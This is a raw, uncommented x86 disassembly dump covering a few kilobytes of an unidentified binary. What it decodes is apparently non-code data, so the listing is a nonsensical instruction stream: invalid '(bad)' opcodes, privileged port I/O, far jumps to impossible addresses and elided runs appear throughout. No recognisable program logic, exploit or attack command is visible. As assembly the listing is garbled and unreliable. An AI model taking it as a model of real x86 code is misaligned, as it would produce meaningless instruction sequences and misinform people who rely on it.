  416bfc:	add    BYTE PTR [ecx],ch
  416bfe:	mov    bh,0x66
  416c00:	outs   dx,BYTE PTR ds:[esi]
  416c01:	adc    eax,DWORD PTR ds:0xe2274c5c
  416c07:	outs   dx,DWORD PTR ds:[esi]
  416c08:	push   edi
  416c09:	sbb    esi,ebx
  416c0b:	pusha  
  416c0c:	pop    esp
  416c0d:	out    dx,al
  416c0e:	in     eax,dx
  416c0f:	pop    esp
  416c10:	jo     0x416bd6
  416c12:	push   eax
  416c13:	push   eax
  416c14:	add    cl,bh
  416c16:	push   ebx
  416c17:	inc    esi
  416c18:	push   esp
  416c19:	cmc    
  416c1a:	inc    ecx
  416c1b:	push   edx
  416c1c:	inc    ebp
  416c1d:	push   ds
  416c1e:	dec    ecx
  416c1f:	popa   
  416c20:	popa   
  416c21:	ficomp DWORD PTR [ebx+0x5d]
  416c24:	jb     0x416c89
  416c26:	mov    DWORD PTR [ecx],eax
  416c28:	inc    edi
  416c29:	jge    0x416bc6
  416c2b:	xor    eax,0x5192775f
  416c30:	pop    edi
  416c31:	push   edi
  416c32:	xchg   esi,eax
  416c33:	add    DWORD PTR [edx+eax*2+0x3a],eax
  416c37:	and    al,0x44
  416c39:	cmp    bh,BYTE PTR [ecx+eax*1]
  416c3c:	push   eax
  416c3d:	inc    edx
  416c3e:	pop    ebx
  416c3f:	xor    esi,DWORD PTR [ebp+0x4c]
  416c42:	pop    esp
  416c43:	sub    BYTE PTR [eax],al
  416c45:	sub    edi,DWORD PTR [edi]
  416c47:	xor    esi,DWORD PTR [ebp+ebx*1+0x4d]
  416c4b:	sub    eax,0x33196363
  416c50:	arpl   WORD PTR [ecx],dx
  416c52:	call   0xae3fd777
  416c57:	push   ebx
  416c58:	arpl   si,di
  416c5a:	div    BYTE PTR [edi]
  416c5c:	arpl   WORD PTR [edi],bx
  416c5e:	adc    eax,0x6336
	...
  416c6f:	add    BYTE PTR [eax],al
  416c71:	adc    ch,BYTE PTR [edi]
  416c73:	jb     0x416c6f
  416c75:	lods   eax,DWORD PTR ds:[esi]
  416c76:	push   ecx
  416c77:	ins    DWORD PTR es:[edi],dx
  416c78:	icebp  
  416c79:	adc    DWORD PTR [edx+0x73],edx
  416c7c:	test   BYTE PTR [ebx],0x25
  416c7f:	jb     0x416ce4
  416c81:	loopne 0x416cd5
  416c83:	push   eax
  416c84:	sar    edi,1
  416c86:	aaa    
  416c87:	ins    DWORD PTR es:[edi],dx
  416c88:	shl    BYTE PTR [edi-0x304fffd3],0x27
  416c8f:	je     0x416c45
  416c91:	int    0x33
  416c93:	arpl   WORD PTR [edi-0x488ddd9f],dx
  416c99:	lds    ebp,FWORD PTR [edi]
  416c9b:	and    BYTE PTR [ebx-0x6e96d584],dl
  416ca1:	lds    ebp,FWORD PTR ds:0xf3bbb700
  416ca7:	inc    ecx
  416ca8:	jp     0x416d1c
  416caa:	inc    edi
  416cab:	je     0x416c40
  416cad:	add    eax,0x2e8d2ad5
  416cb2:	out    0x51,eax
  416cb4:	lahf   
  416cb5:	push   esp
  416cb6:	xor    BYTE PTR [edi],0x80
  416cb9:	xor    al,0xbd
  416cbb:	sub    dh,BYTE PTR [ebp+0x2e]
  416cbe:	out    0x5f,eax
  416cc0:	sub    eax,0x51477322
  416cc5:	cs jge 0x416cee
  416cc8:	arpl   WORD PTR [ebp-0x78],dx
  416ccb:	xor    al,0x52
  416ccd:	push   eax
  416cce:	push   esi
  416ccf:	ss inc edi
  416cd1:	add    eax,0x3634
	...
  416ce2:	add    BYTE PTR [edi+0x5],al
  416ce5:	cmp    al,0x35
  416ce7:	inc    eax
  416ce8:	xor    ebx,DWORD PTR ds:0xe7223823
  416cee:	push   ebp
  416cef:	push   cs
  416cf0:	sub    BYTE PTR [ebx],dh
  416cf2:	dec    eax
  416cf3:	cld    
  416cf4:	xor    cl,BYTE PTR [ebp+eiz*1+0x17]
  416cf8:	sub    BYTE PTR [ecx],bh
  416cfa:	cmp    esp,DWORD PTR [ebx+0x55]
  416cfd:	push   ss
  416cfe:	test   DWORD PTR ss:[edx+edi*1],0x1e30fd31
  416d06:	and    esi,ecx
  416d08:	and    DWORD PTR [ebx],ebp
  416d0a:	push   ebp
  416d0b:	div    BYTE PTR [ecx]
  416d0d:	sti    
  416d0e:	sub    eax,DWORD PTR [ebx-0x3fc5efad]
  416d14:	xor    eax,edi
  416d16:	push   edi
  416d17:	shl    BYTE PTR [edx],0xff
  416d1a:	xor    DWORD PTR [esi-0x3bd729d7],esi
  416d20:	and    dl,bl
  416d22:	pop    edi
  416d23:	mov    fs,WORD PTR [eax]
  416d25:	leave  
  416d26:	inc    edi
  416d27:	mov    cl,0x2c
  416d29:	aad    0x26
  416d2b:	xchg   DWORD PTR [edx-0x2a],eax
  416d2e:	xor    DWORD PTR [ebp+0x7c37ca20],ecx
  416d34:	es add bh,al
  416d37:	push   edi
  416d38:	add    eax,0x2f4ec451
  416d3d:	arpl   WORD PTR [ebx-0x7b8fd16c],bx
  416d43:	pusha  
  416d44:	aas    
  416d45:	push   esp
  416d46:	mov    ecx,0x0
	...
  416d57:	inc    esi
  416d58:	dec    ebp
  416d59:	lahf   
  416d5a:	mov    WORD PTR [ebx+0x4d],ss
  416d5d:	mov    ch,0x60
  416d5f:	aas    
  416d60:	push   esp
  416d61:	cdq    
  416d62:	pop    ds
  416d63:	dec    eax
  416d64:	dec    esi
  416d65:	jmp    0x87b3943c
  416d6a:	pusha  
  416d6b:	pop    ecx
  416d6c:	push   eax
  416d6d:	pop    ebx
  416d6e:	mov    WORD PTR [edi],ds
  416d70:	addr16 dec ebp
  416d72:	mov    dh,BYTE PTR [eax+eax*1]
  416d75:	push   0x22
  416d77:	mov    ecx,0xad305f0d
  416d7c:	cmp    cl,BYTE PTR [si]
  416d7f:	mov    eax,0x355b3568
  416d84:	cmp    al,BYTE PTR [esi]
  416d86:	jl     0x416d3e
  416d88:	gs xor eax,0xe371354b
  416d8e:	(bad)  
  416d8f:	jmp    0x357c7493
  416d94:	cmp    al,dh
  416d96:	jge    0x416d4e
  416d98:	outs   dx,BYTE PTR ds:[esi]
  416d99:	sbb    DWORD PTR [edx],edi
  416d9b:	xor    ebx,DWORD PTR [edi-0x17]
  416d9e:	xchg   ebp,eax
  416d9f:	push   esi
  416da0:	outs   dx,BYTE PTR ds:[esi]
  416da1:	add    eax,0xfd5f2245
  416da6:	pusha  
  416da7:	pop    eax
  416da8:	push   ecx
  416da9:	(bad)  
  416daa:	jle    0x416ddd
  416dac:	jne    0x416d76
  416dae:	jb     0x416dd2
  416db0:	pop    esp
  416db1:	scas   al,BYTE PTR es:[edi]
  416db2:	jo     0x416dd6
  416db4:	jb     0x416d7e
  416db6:	inc    eax
  416db7:	push   ebp
  416db8:	ins    DWORD PTR es:[edi],dx
  416db9:	mov    DWORD PTR [eax],0x0
	...
  416dc7:	add    BYTE PTR [eax],al
  416dc9:	ins    BYTE PTR es:[edi],dx
  416dca:	xor    BYTE PTR [edi+0x0],bl
  416dcd:	fsubr  st,st(4)
  416dcf:	dec    DWORD PTR [ebx+0x2b]
  416dd2:	repz jae 0x416df5
  416dd5:	mov    esi,0x196571e8
  416dda:	out    dx,al
  416ddb:	push   0x72
  416ddd:	ret    
  416dde:	mov    dl,0xfd
  416de0:	dec    ebx
  416de1:	jmp    0x416dd5
  416de3:	jae    0x416e05
  416de5:	ret    
  416de6:	out    0x6e,eax
  416de8:	je     0x416dc5
  416dea:	in     eax,0x6b
  416dec:	and    dl,bh
  416dee:	loopne 0x416e63
  416df0:	push   0x657046ca
  416df5:	dec    eax
  416df6:	loope  0x416e25
  416df8:	dec    eax
  416df9:	out    dx,al
  416dfa:	push   esp
  416dfb:	dec    esp
  416dfc:	pop    esp
  416dfd:	sbb    ecx,ebp
  416dff:	pusha  
  416e00:	ins    BYTE PTR es:[edi],dx
  416e01:	es and eax,0xe71f706b
  416e07:	pop    ebx
  416e08:	arpl   WORD PTR [ebp-0xc],sp
  416e0b:	push   0xffed3461
  416e10:	jbe    0x416e45
  416e12:	repnz pusha 
  416e14:	dec    si
  416e16:	icebp  
  416e17:	outs   dx,BYTE PTR ds:[esi]
  416e18:	jb     0x416e66
  416e1a:	repnz sub eax,0xffe75362
  416e20:	pop    ebx
  416e21:	dec    ebx
  416e22:	loop   0x416e84
  416e24:	inc    edx
  416e25:	inc    ebx
  416e26:	pop    ebp
  416e27:	add    BYTE PTR [ebx+0x65],dl
  416e2a:	fbstp  TBYTE PTR [ebx+0x77]
	...
  416e39:	add    BYTE PTR [eax],al
  416e3b:	add    BYTE PTR [ebx-0x9],ch
  416e3e:	pusha  
  416e3f:	pop    esp
  416e40:	mov    ebp,eax
  416e42:	pusha  
  416e43:	inc    edx
  416e44:	or     DWORD PTR [ebp+0x0],0x4d
  416e48:	push   0xf553004e
  416e4d:	dec    edx
  416e4e:	push   esp
  416e4f:	push   edi
  416e50:	or     edx,DWORD PTR [edi+0x41]
  416e53:	pop    esp
  416e54:	arpl   WORD PTR [edi+0x2d],bx
  416e57:	pop    edi
  416e58:	mov    al,0xcf
  416e5a:	sub    BYTE PTR [ecx-0x41],dh
  416e5d:	xchg   edx,eax
  416e5e:	cmp    al,0x70
  416e60:	jle    0x416ec4
  416e62:	sub    al,0x62
  416e64:	scas   eax,DWORD PTR es:[edi]
  416e65:	ja     0x416ea9
  416e67:	inc    edx
  416e68:	push   edx
  416e69:	ins    BYTE PTR es:[edi],dx
  416e6a:	out    dx,eax
  416e6b:	inc    eax
  416e6c:	xor    esp,DWORD PTR [eax+esi*8+0x37]
  416e70:	xor    esp,DWORD PTR [ebp+0x5d372af5]
  416e76:	inc    esp
  416e77:	inc    ecx
  416e78:	ss pusha 
  416e7a:	inc    edx
  416e7b:	inc    esi
  416e7c:	xchg   esi,eax
  416e7d:	fprem1 
  416e7f:	and    bh,BYTE PTR cs:[ebp+esi*8+0x42]
  416e84:	xchg   ecx,eax
  416e85:	jae    0x416eca
  416e87:	xor    eax,0x407b8c
  416e8c:	adc    bl,bh
  416e8e:	inc    ebp
  416e8f:	push   esp
  416e90:	or     al,0xdd
  416e92:	push   ecx
  416e93:	inc    ebx
  416e94:	pandn  mm5,QWORD PTR [edi]
  416e97:	pop    edi
  416e98:	xor    BYTE PTR [edi+0x25],cl
  416e9b:	jno    0x416edc
  416e9d:	adc    bh,BYTE PTR [ecx]
  416e9f:	jo     0x416ea1
	...
  416ead:	add    BYTE PTR [eax],al
  416eaf:	(bad)  
  416eb0:	loope  0x416eda
  416eb2:	bound  ebp,QWORD PTR [edi]
  416eb4:	idiv   eax
  416eb6:	inc    edx
  416eb7:	and    bh,BYTE PTR [ecx-0x5acecd0a]
  416ebd:	out    dx,al
  416ebe:	inc    edx
  416ebf:	xor    dl,al
  416ec1:	out    dx,eax
  416ec2:	sub    dh,BYTE PTR [edi]
  416ec4:	shl    esi,cl
  416ec6:	xor    al,0x36
  416ec8:	loopne 0x416f08
  416eca:	xor    eax,0x3446d99a
  416ecf:	fwait
  416ed0:	jo     0x416ec8
  416ed2:	inc    ebp
  416ed3:	mov    ebp,DWORD PTR [esi-0xc]
  416ed6:	xor    BYTE PTR [ecx-0x4bffc321],dl
  416edc:	add    eax,0x2bc030d0
  416ee1:	shl    DWORD PTR [ebx],cl
  416ee3:	mov    dl,0x37
  416ee5:	fnsave [eax]
  416ee7:	jne    0x416f07
  416ee9:	mov    ebp,0xd03c632a
  416eee:	xor    BYTE PTR [eax+0x3d33b32b],al
  416ef4:	push   ds
  416ef5:	lds    ebp,FWORD PTR [edx]
  416ef7:	arpl   WORD PTR [ebx-0x6d],cx
  416efa:	push   ebx
  416efb:	xchg   ebp,eax
  416efc:	and    al,0xa0
  416efe:	and    bh,BYTE PTR [esi+0x2a]
  416f01:	cdq    
  416f02:	in     eax,dx
  416f03:	xchg   BYTE PTR [ecx],bh
  416f05:	xchg   edi,eax
  416f06:	add    ebx,DWORD PTR [ebp+0x4e55b759]
  416f0c:	mov    BYTE PTR cs:[eax+eax*2],ah
  416f10:	aaa    
  416f11:	int    0x32
	...
  416f1f:	add    BYTE PTR [eax],al
  416f21:	add    BYTE PTR [edx+0x5],al
  416f24:	xchg   ebx,eax
  416f25:	push   ecx
  416f26:	cmp    ebx,DWORD PTR [esi]
  416f28:	jge    0x416f56
  416f2a:	adc    ah,BYTE PTR [ecx*2+0x4e288538]
  416f31:	das    
  416f32:	arpl   WORD PTR [ebx],sp
  416f34:	pop    edx
  416f35:	xor    DWORD PTR [edx-0x1d],esi
  416f38:	inc    edx
  416f39:	xor    BYTE PTR [edi],cl
  416f3b:	add    eax,0x54325135
  416f40:	xor    BYTE PTR [esi],ch
  416f42:	add    al,0x39
  416f44:	out    0x4d,eax
  416f46:	xor    bl,BYTE PTR [eax+0xe]
  416f49:	push   ecx
  416f4a:	or     edi,DWORD PTR [edx]
  416f4c:	sbb    ebp,DWORD PTR [eax]
  416f4e:	push   es
  416f4f:	cmp    al,0xd
  416f51:	add    al,0x1d
  416f53:	pop    eax
  416f54:	cmp    al,BYTE PTR [edx+0x4]
  416f57:	cmp    BYTE PTR [esi+esi*8],al
  416f5a:	nop
  416f5b:	push   edx
  416f5c:	sub    esp,DWORD PTR [edi]
  416f5e:	ret    0x322
  416f61:	daa    
  416f62:	mov    eax,ds:0x7d0f0038
  416f67:	es jb  0x416f53
  416f6a:	xchg   ebx,eax
  416f6b:	inc    esi
  416f6c:	inc    ecx
  416f6d:	mov    al,0x8c
  416f6f:	inc    esi
  416f70:	dec    ebx
  416f71:	mov    esi,0xcc6337a6
  416f76:	cdq    
  416f77:	cmp    DWORD PTR [ebx-0x44],esp
  416f7a:	pusha  
  416f7b:	push   ebp
  416f7c:	dec    ecx
  416f7d:	clc    
  416f7e:	adc    DWORD PTR [edx+0x45],edx
  416f81:	les    edx,FWORD PTR [edx+ecx*2+0x6e]
  416f85:	mov    ebp,0x0
	...
  416f92:	add    BYTE PTR [eax],al
  416f94:	add    BYTE PTR ds:0x4cc86e37,bh
  416f9a:	cmp    al,0x63
  416f9c:	mov    al,ds:0x956d2193
  416fa1:	pusha  
  416fa2:	push   ebp
  416fa3:	dec    ecx
  416fa4:	fdiv   st,st(1)
  416fa6:	push   ecx
  416fa7:	aas    
  416fa8:	xchg   esp,eax
  416fa9:	xchg   esp,eax
  416faa:	sbb    eax,0x2a8c9763
  416faf:	popa   
  416fb0:	mov    BYTE PTR [esi+eiz*1-0x1de46700],dl
  416fb7:	cs call 0x2482:0x2d5d5724
  416fbf:	jb     0x417021
  416fc1:	ja     0x416ffc
  416fc3:	add    BYTE PTR [ecx],bh
  416fc5:	adc    al,0xe2
  416fc7:	cs and DWORD PTR cs:[edi],esi
  416fcb:	arpl   WORD PTR [esp+ebp*1+0x21],cx
  416fcf:	ins    DWORD PTR es:[edi],dx
  416fd0:	xor    eax,0xe9000567
  416fd5:	pusha  
  416fd6:	add    eax,0x560e900
  416fdb:	add    cl,ch
  416fdd:	pusha  
  416fde:	add    eax,0x560e900
  416fe3:	add    cl,ch
  416fe5:	pusha  
  416fe6:	add    eax,0x560e900
  416feb:	add    BYTE PTR [eax],al
  416fed:	dec    edx
  416fee:	push   es
  416fef:	add    BYTE PTR [eax],al
  416ff1:	cmp    al,BYTE PTR [esi]
  416ff3:	add    BYTE PTR [ebx+0x4b],dh
  416ff6:	jmp    0x0:0x7464
	...
  417005:	add    BYTE PTR [eax],al
  417007:	add    BYTE PTR [edi-0x46],ah
  41700a:	sub    esp,DWORD PTR [esi+ecx*1-0x16]
  41700e:	push   DWORD PTR [edx+0xb]
  417011:	jmp    0x6f5c:0xbb177464
  417018:	cmp    ah,ch
  41701a:	ins    DWORD PTR es:[edi],dx
  41701b:	add    cl,bl
  41701d:	clc    
  41701e:	imul   ebp,DWORD PTR [ecx-0x2a],0xffffffe4
  417022:	cs pop edi
  417024:	sbb    edx,ebp
  417026:	push   0x73
  417028:	daa    
  417029:	push   es
  41702a:	outs   dx,DWORD PTR ds:[esi]
  41702b:	jno    0x416ffb
  41702d:	loopne 0x4170a2
  41702f:	or     DWORD PTR gs:[edi+0x70],ecx
  417033:	jb     0x41700c
  417035:	cmc    
  417036:	pop    esp
  417037:	jb     0x417020
  417039:	add    eax,0xe0ee716f
  41703e:	jae    0x4170a5
  417040:	or     DWORD PTR [edi+0x6f],ecx
  417043:	je     0x41701c
  417045:	cmc    
  417046:	push   DWORD PTR [edx+0x3b]
  417049:	jmp    0x635c:0xba277464
  417050:	sbb    eax,0x1c6d70dd
  417055:	dec    esi
  417056:	bound  edi,QWORD PTR [ecx+0x36]
  417059:	in     al,0x6e
  41705b:	add    BYTE PTR [ecx-0x8],bl
  41705e:	imul   ebp,DWORD PTR [ecx+0x56],0xffffffe4
  417062:	cs pop edi
  417064:	sbb    esi,ebx
  417066:	imul   esi,DWORD PTR [ebp+0x3f],0xffffffdf
  41706a:	pop    edx
  41706b:	bound  eax,QWORD PTR [eax]
	...
  417079:	add    BYTE PTR [eax],al
  41707b:	dec    esi
  41707c:	fisub  WORD PTR [ecx+0x0]
  41707f:	jp     0x41705d
  417081:	push   0x7a
  417083:	arpl   WORD PTR [edi],cx
  417085:	xor    ebp,DWORD PTR [edx+ecx*8+0x1a]
  417089:	pop    ds
  41708a:	xor    DWORD PTR [ebp+0x636c2802],eax
  417090:	stos   DWORD PTR es:[edi],eax
  417091:	xor    al,0x6c
  417093:	mov    edx,0x9c3120b2
  417098:	scas   eax,DWORD PTR es:[edi]
  417099:	xor    DWORD PTR [ebx-0x3b],esp
  41709c:	sahf   
  41709d:	outs   dx,DWORD PTR ss:[esi]
  41709f:	mov    edi,0x70632dd5
  4170a4:	ja     0x4170cc
  4170a6:	ins    BYTE PTR es:[edi],dx
  4170a7:	mov    ebx,cs
  4170a9:	and    BYTE PTR [eax],al
  4170ab:	nop
  4170ac:	ins    DWORD PTR es:[edi],dx
  4170ad:	and    eax,0xf6c99767
  4170b2:	pop    esp
  4170b3:	xchg   ebx,eax
  4170b4:	ins    BYTE PTR es:[edi],dx
  4170b5:	and    BYTE PTR [eax-0x7e],dh
  4170b8:	ins    BYTE PTR es:[edi],dx
  4170b9:	and    BYTE PTR [eax],al
  4170bb:	jo     0x41704a
  4170bd:	and    eax,0xf6897767
  4170c2:	pop    esp
  4170c3:	jo     0x417057
  4170c5:	and    BYTE PTR [eax+0x63],dh
  4170c8:	mov    esi,DWORD PTR [esp+ebp*2]
  4170cb:	dec    edx
  4170cc:	xor    ah,BYTE PTR [eax]
  4170ce:	xor    DWORD PTR [ebx+edi*2],ebp
  4170d1:	sub    ch,BYTE PTR [esi+ecx*2-0x77]
  4170d5:	daa    
  4170d6:	pop    ebp
  4170d7:	inc    ecx
  4170d8:	xor    eax,0x9e30632d
  4170dd:	xor    al,0x6f
	...
  4170eb:	add    BYTE PTR [eax],al
  4170ed:	add    BYTE PTR [edi],bh
  4170ef:	push   ebp
  4170f0:	xor    BYTE PTR [ebx+0x70],ah
  4170f3:	mul    DWORD PTR [edx]
  4170f5:	ins    DWORD PTR es:[edi],dx
  4170f6:	mulps  xmm4,XMMWORD PTR ds:0x283c346e
  4170fd:	ins    DWORD PTR es:[edi],dx
  4170fe:	add    DWORD PTR [esi-0x619cffff],ebx
  417104:	add    DWORD PTR [eax],eax
  417106:	arpl   WORD PTR [esi+0x5630001],bx
  41710c:	out    0x3,eax
  41710e:	arpl   WORD PTR ds:0x56303e7,ax
  417114:	out    0x3,eax
  417116:	arpl   WORD PTR ds:0x56303e7,ax
  41711c:	out    0x3,eax
  41711e:	arpl   WORD PTR ds:0x33d303e7,ax
  417124:	push   es
  417125:	and    al,ah
  417127:	and    DWORD PTR [esi*1+0x2ad51e85],eax
  41712e:	arpl   WORD PTR [ebp-0x27],dx
  417131:	sub    BYTE PTR [ebp+0x631ec31e],bh
  417137:	ficom  DWORD PTR ds:[ebp-0x80]
  41713b:	and    eax,ecx
  41713d:	das    
  41713e:	test   BYTE PTR [edi],dh
  417140:	les    eax,FWORD PTR [ebx]
  417142:	mov    bl,0x26
  417144:	mov    ebx,0xc855632b
  417149:	das    
  41714a:	mov    ebx,DWORD PTR [ecx-0x6a]
  41714d:	imul   ebp,DWORD PTR ds:[edx],0xffffffe7
  417151:	xor    al,0x0
	...
  41715f:	add    BYTE PTR [eax],al
  417161:	jl     0x41718b
  417163:	test   DWORD PTR [eax],ebp
  417165:	dec    ebp
  417166:	xor    al,0xbd
  417168:	xor    al,0x44
  41716a:	and    DWORD PTR [eax+0x7a05402f],edx
  417170:	sub    bh,BYTE PTR [esi]
  417172:	pop    ds
  417173:	xchg   BYTE PTR [ecx],ch
  417175:	xor    bl,bh
  417177:	jb     0x4171b4
  417179:	das    
  41717a:	add    eax,0x1f462b5a
  41717f:	dec    esi
  417180:	sub    dh,BYTE PTR [edx]
  417182:	repz add al,0x30
  417185:	sbb    edi,DWORD PTR [ecx]
  417187:	out    0x34,eax
  417189:	cld    
  41718a:	daa    
  41718b:	push   ebp
  41718c:	sub    ebp,edi
  41718e:	xor    edi,edx
  417190:	jmp    0x3d419ea5
  417195:	addr16 out 0x31,al
  417198:	dec    edx
  417199:	pop    edi
  41719a:	out    0x31,al
  41719c:	or     eax,0x431e667
  4171a1:	pop    edi
  4171a2:	push   esi
  4171a3:	inc    ebx
  4171a4:	and    eax,0xc954449c
  4171a9:	mov    BYTE PTR [eax],ah
  4171ab:	jno    0x4171aa
  4171ad:	jp     0x4171fd
  4171af:	imul   eax,DWORD PTR [ebx+edi*1],0xf
  4171b3:	arpl   WORD PTR [edi],ax
  4171b5:	xchg   BYTE PTR [ebx],dh
  4171b7:	ja     0x4171b2
  4171b9:	test   BYTE PTR [edx],ah
  4171bb:	fs mov esp,0xcf722277
  4171c1:	sbb    DWORD PTR [edx],0x563
	...
  4171d3:	add    BYTE PTR [edi],al
  4171d5:	and    al,0x6e
  4171d7:	retf   0x364e
  4171da:	jo     0x417199
  4171dc:	ins    DWORD PTR es:[edi],dx
  4171dd:	sub    DWORD PTR [eax-0x38],edx
  4171e0:	dec    edi
  4171e1:	xor    al,0x75
  4171e3:	(bad)  
  4171e4:	sub    DWORD PTR ss:[eax],esp
  4171e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e8:	mov    es,WORD PTR [eax+0x4b]
  4171eb:	leave  
  4171ec:	inc    ebp
  4171ed:	and    BYTE PTR [edx-0x42],bh
  4171f0:	cmp    al,0x20
  4171f2:	or     BYTE PTR gs:[edx-0x7658ffcc],0x33
  4171fa:	arpl   WORD PTR [edi-0x62ffd285],cx
  417200:	sbb    eax,0x84807a20
  417205:	and    DWORD PTR [edi-0x73],ebx
  417208:	and    ah,BYTE PTR [esi]
  41720a:	jb     0x417258
  41720c:	dec    ebp
  41720d:	and    BYTE PTR [eax+0x3d],bh
  417210:	pop    edi
  417211:	push   esp
  417212:	ins    DWORD PTR es:[edi],dx
  417213:	dec    edi
  417214:	push   ebx
  417215:	cmp    BYTE PTR [edi+0x5b],bl
  417218:	inc    edx
  417219:	push   ecx
  41721a:	dec    ebx
  41721b:	add    BYTE PTR ds:0x166c64eb,dh
  417221:	call   0x9ca89f25
  417226:	std    
  417227:	gs cs stc 
  41722a:	cmp    DWORD PTR [edi],ebp
  41722c:	xchg   ebp,eax
  41722d:	add    ch,BYTE PTR [eax+0x74]
  417230:	dec    esi
  417231:	stc    
  417232:	cmp    DWORD PTR [edi],ebp
  417234:	and    eax,0x746802
	...
  417245:	add    BYTE PTR [eax],al
  417247:	outs   dx,BYTE PTR ds:[esi]
  417248:	stc    
  417249:	outs   dx,BYTE PTR ds:[esi]
  41724a:	cmp    dh,BYTE PTR ds:0x4e65fda7
  417250:	repnz sub eax,0x71e06c00
  417256:	gs jl  0x4172ae
  417259:	push   eax
  41725a:	jae    0x41726f
  41725c:	fisub  WORD PTR [eax+0x73]
  41725f:	push   esp
  417260:	in     eax,0x5c
  417262:	je     0x41726e
  417264:	push   ebx
  417265:	popa   
  417266:	popa   
  417267:	mul    esi
  417269:	ins    DWORD PTR es:[edi],dx
  41726a:	imul   ebx,DWORD PTR [edi],0xfffffff1
  41726d:	call   FWORD PTR [ebx-0x49]
  417270:	out    0x79,al
  417272:	imul   esp,DWORD PTR [esi],0xd95c5ce6
  417278:	in     al,0x5c
  41727a:	dec    ebp
  41727b:	aad    0xe7
  41727d:	gs retw 
  417280:	push   ebp
  417281:	add    BYTE PTR [esi-0x1a],al
  417284:	out    0x5e,al
  417286:	imul   ecx,edx,0x55
  417289:	inc    esi
  41728a:	ins    BYTE PTR es:[edi],dx
  41728b:	cmc    
  41728c:	loop   0x4172f4
  41728e:	pop    esp
  41728f:	clc    
  417290:	repz push 0x77
  417293:	cmp    ebp,esp
  417295:	jno    0x4172f3
  417297:	retf   0x6b3c
  41729a:	jp     0x4172af
  41729c:	(bad)  [ebx+0x61]
  41729f:	mov    edx,0x636f4955
  4172a4:	push   edx
  4172a5:	sub    ebp,DWORD PTR [edi+eax*1+0x3d]
  4172a9:	pop    eax
  4172aa:	push   eax
	...
  4172b7:	add    BYTE PTR [eax],al
  4172b9:	add    BYTE PTR [ecx],dl
  4172bb:	push   edi
  4172bc:	push   ds
  4172bd:	test   DWORD PTR [bx+si+0x31],0x250b635c
  4172c5:	out    dx,ax
  4172c7:	mul    BYTE PTR [edx]
  4172c9:	jb     0x4172d1
  4172cb:	dec    eax
  4172cc:	dec    eax
  4172cd:	arpl   si,di
  4172cf:	cli    
  4172d0:	sub    eax,DWORD PTR [esi-0x49]
  4172d3:	out    dx,al
  4172d4:	add    edi,DWORD PTR [edi]
  4172d6:	ror    DWORD PTR [esi],cl
  4172d8:	inc    eax
  4172d9:	rcr    DWORD PTR [bp+0x6d45],1
  4172de:	sar    ch,0x27
  4172e1:	inc    esp
  4172e2:	retf   0x1b0
  4172e5:	(bad)  
  4172e6:	les    ebp,FWORD PTR [ebx-0x2f3d94d6]
  4172ec:	sub    ch,BYTE PTR [esi]
  4172ee:	mov    edi,0xb0002dbd
  4172f3:	lds    ebp,FWORD PTR ds:0x1b6caa63
  4172f9:	ins    DWORD PTR es:[edi],dx
  4172fa:	cmp    eax,0x63503b8d
  4172ff:	pop    ebx
  417300:	sbb    eax,0x3b9e8d67
  417305:	pop    edi
  417306:	ins    DWORD PTR es:[edi],dx
  417307:	imul   ebp,DWORD PTR [edi],0x67
  41730a:	ja     0x417385
  41730c:	xor    ch,BYTE PTR [esi]
  41730e:	jg     0x41738d
  417310:	sub    eax,0x23853400
  417315:	inc    esi
  417316:	das    
  417317:	outs   dx,BYTE PTR ds:[esi]
  417318:	add    DWORD PTR [ecx+0x3a],esi
  41731b:	sub    ah,BYTE PTR [eax]
  41731d:	jno    0x41731f
	...
  41732b:	add    BYTE PTR [eax],al
  41732d:	jne    0x4172b1
  41732f:	pop    ds
  417330:	add    BYTE PTR [eax],ah
  417332:	bound  edx,QWORD PTR [edx+0x47]
  417335:	pop    ds
  417336:	jp     0x417372
  417338:	das    
  417339:	jb     0x417340
  41733b:	sub    dh,bl
  41733d:	and    ah,dh
  41733f:	adc    dh,bl
  417341:	dec    ecx
  417342:	inc    esi
  417343:	adc    bh,ch
  417345:	and    bl,dl
  417347:	pop    ss
  417348:	repz add bh,dh
  41734b:	adc    edi,esp
  41734d:	inc    ebp
  41734e:	in     eax,dx
  41734f:	mul    dh
  417351:	dec    esp
  417352:	cmc    
  417353:	out    dx,al
  417354:	repz xor eax,0x32f12941
  41735a:	inc    ebx
  41735b:	sub    eax,0x3048e9f0
  417360:	es mov bl,0x37
  417363:	push   es
  417364:	and    DWORD PTR [edx-0x3fd1e6de],esi
  41736a:	aaa    
  41736b:	mov    edx,0x43744f1
  417370:	xor    dh,BYTE PTR [ebp-0x7acf06de]
  417376:	sub    eax,0x496327fc
  41737b:	lods   eax,DWORD PTR ds:[esi]
  41737c:	dec    edi
  41737d:	xchg   ebx,eax
  41737e:	inc    esp
  41737f:	les    ebp,FWORD PTR [edi]
  417381:	xchg   edi,eax
  417382:	and    bl,cl
  417384:	add    esp,DWORD PTR [eax-0x7ee04ca8]
  41738a:	not    DWORD PTR [eax+eiz*1]
  41738d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41738e:	xor    edi,esp
  417390:	push   edx
	...
  41739d:	add    BYTE PTR [eax],al
  41739f:	add    BYTE PTR [edi+0x4522bb26],ah
  4173a5:	and    eax,ecx
  4173a7:	das    
  4173a8:	arpl   WORD PTR [ecx-0x54],cx
  4173ab:	xor    BYTE PTR [edi+0x38],ch
  4173ae:	mov    ds,WORD PTR ds:0x47a84957
  4173b4:	sbb    eax,0x2403b751
  4173b9:	sbb    edi,DWORD PTR [ebx+0x1e]
  4173bc:	push   ecx
  4173bd:	sbb    eax,DWORD PTR [edi+ebp*1+0x71004283]
  4173c4:	jo     0x4173df
  4173c6:	ins    DWORD PTR es:[edi],dx
  4173c7:	jnp    0x417416
  4173c9:	aaa    
  4173ca:	add    BYTE PTR [esi],bh
  4173cc:	js     0x4173e9
  4173ce:	addr16 dec edi
  4173d0:	jl     0x417403
  4173d2:	inc    ecx
  4173d3:	dec    eax
  4173d4:	inc    edx
  4173d5:	sbb    eax,0x28512a63
  4173da:	fs dec esp
  4173dc:	cmp    eax,0x4b486731
  4173e1:	add    BYTE PTR ss:[edx+edx*1],ah
  4173e5:	in     eax,0x46
  4173e7:	and    al,0x87
  4173e9:	inc    ecx
  4173ea:	push   esp
  4173eb:	cmp    DWORD PTR [edi+0x3b],edi
  4173ee:	pop    edi
  4173ef:	sbb    dl,BYTE PTR [edx-0x7ce492d0]
  4173f5:	xor    al,0x0
  4173f7:	and    eax,0x304feab7
  4173fc:	dec    ecx
  4173fd:	or     eax,DWORD PTR [eax]
